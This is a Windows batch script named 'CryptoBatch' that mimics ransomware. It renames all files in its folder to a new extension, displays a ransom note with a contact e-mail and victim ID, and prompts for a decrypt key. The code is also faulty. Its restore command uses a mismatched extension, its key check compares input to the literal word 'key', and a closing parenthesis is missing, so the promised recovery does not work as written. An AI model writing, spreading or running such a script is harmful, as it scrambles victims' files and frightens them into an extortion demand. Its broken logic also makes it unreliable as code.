@echo off
color 02
title CryptoBatch
ren *.* *.crtbatch
echo ATTENTION!
echo -------------------------------------------------------------------------------------------------------------
echo All your files like photos, databases, documents and other important are encrypted!        
echo Don’t worry, you can return all your files!
echo The only method of recovering files is to get an unique key for you.
echo To get the key you need write on our e-mail and send with your ID:
echo Our E-mail:
echo decrypt@cryptobatch.com 
echo Your personal ID:
echo 9315hTlGeRsMht5nsgsaoejm4RWx1y69zcacA5hSp3l60BnY8f3q
echo -------------------------------------------------------------------------------------------------------------
pause 
echo Type your decrypt key:
set /p key=asd3SGd8723bqD7SH8JmYm298WxkjhasiuSDFS35Je5RhszHsdsals6
if %key%==key (
ren *.crtbat *.*
echo Your files are decrypted!
pause 
exit
)
if not %key%==key (
echo Sorry, wrong key!
echo Stay happily with your encrypted files...
echo pause 
exit
